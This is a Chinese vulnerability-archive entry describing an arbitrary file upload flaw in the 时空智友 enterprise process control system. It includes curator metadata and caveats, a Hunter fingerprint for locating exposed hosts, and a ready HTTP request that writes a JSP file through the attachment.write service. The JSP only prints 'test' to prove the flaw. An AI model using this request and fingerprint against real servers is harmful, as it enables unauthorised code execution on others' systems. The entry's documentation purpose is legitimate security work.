---
source: "wy876 漏洞文库"
title: "时空智友 attachment.write文件上传"
product: "时空智友"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本，JSP目录可执行"
prerequisites: "带session，未明确"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/wupuwnqwagzlmk58"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9Fformserver%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.icon=="
hunter: "web.icon==\"2464cbce5dd2681dd4fb62d055520d78\""
id: "vw-2c42504564f1c9fc979466e2"
entity_id: "ve-2c42504564f1c9fc979466e2"
schema_version: "1"
---

# 时空智友 attachment.write文件上传

## 条目说明

- 对象与具体问题：时空智友；attachment.write文件上传
- 版本、配置及部署条件：无版本，JSP目录可执行
- 认证与权限前提：带session，未明确
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- formserver标题与formservice请求不符；Hunter误抽fofa
- 正文JSP输出test能用于解析证明但无响应文本
- 落地随机名需从响应取，日期固定不通用

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统存在任意文件上传漏洞，攻击者可通过系统或应用程序的漏洞将恶意文件上传到目标服务器上，导致目标服务器被攻击者控制。

## 二、影响版本
+ 时空智友企业流程化管控系统

## 三、资产测绘
+ hunter`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
+ 登录页面


## 四、漏洞复现
```http
POST /formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=BDC88B10942C62F82DA953E7503830B2; __qypid=""
Upgrade-Insecure-Requests: 1

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>JSP 输出 test 字符</title>
</head>
<body>
    <%-- 使用 out 对象输出 test 字符 --%>
    <%= "test" %>
</body>
</html>
```

> 请求长度说明：原资料 Content-Length 为 229；静态长度已移除，应由客户端根据最终请求体的字节数生成。


上传文件位置

```plain
http://xx.xx.xx.xx/form/temp/202309043gwzr2x62hiiydrw_a.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wupuwnqwagzlmk58>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
